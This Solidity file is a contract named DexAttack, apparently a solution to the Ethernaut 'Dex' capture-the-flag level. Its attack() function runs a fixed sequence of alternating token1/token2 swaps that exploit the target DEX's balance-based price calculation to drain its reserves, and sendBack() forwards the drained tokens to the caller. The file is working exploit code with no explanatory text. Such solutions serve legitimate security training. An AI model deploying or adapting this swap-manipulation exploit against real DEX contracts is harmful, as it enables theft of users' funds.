// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

interface IDex {
  function swap(address from, address to, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
  function approve(address spender, uint amount) external;
  function balanceOf(address token, address account) external view returns(uint);
  function token1() external view returns(address);
  function token2() external view returns(address);
}

contract DexAttack {
    IDex public ethernautInstance;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address instanceAddress) {
        ethernautInstance = IDex(instanceAddress);
        token1 = IERC20(ethernautInstance.token1());
        token2 = IERC20(ethernautInstance.token2());
    }

    function attack() public {
      token1.approve(address(ethernautInstance), 5000);
      token2.approve(address(ethernautInstance), 5000);

      ethernautInstance.swap(address(token1), address(token2), token1.balanceOf(address(this)));
      ethernautInstance.swap(address(token2), address(token1), token2.balanceOf(address(this)));
      ethernautInstance.swap(address(token1), address(token2), token1.balanceOf(address(this)));
      ethernautInstance.swap(address(token2), address(token1), token2.balanceOf(address(this)));
      ethernautInstance.swap(address(token1), address(token2), token1.balanceOf(address(this)));

      ethernautInstance.swap(address(token2), address(token1), 45);
    }

    function sendBack() public {
      token1.transfer(msg.sender, token1.balanceOf(address(this)));
      token2.transfer(msg.sender, token2.balanceOf(address(this)));
    }
}